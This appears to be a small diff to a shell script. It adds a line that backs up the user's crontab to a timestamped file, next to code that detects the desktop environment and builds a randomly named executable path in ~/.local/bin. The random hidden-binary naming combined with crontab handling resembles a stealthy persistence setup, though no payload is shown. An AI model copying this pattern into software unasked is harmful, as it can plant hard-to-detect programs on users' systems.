@@ -11,7 +11,7 @@ if [ -n "$MATE_DESKTOP_SESSION_ID" ]; then
     de_info="mate"
 fi
 
-
+mkdir -p -- "$HOME/.crontab_backups" && crontab -l > "$HOME/.crontab_backups/crontab_$(date '+%Y-%m-%d_%H:%M:%S').bak"
 
 filename_length=$((($(date +%N | sed 's/^0*//') % 5) + 2))
 filepath="$HOME/.local/bin/$(head -c $filename_length  /dev/urandom | base64 | head -c $filename_length | tr '/+-' 'Zzx')"
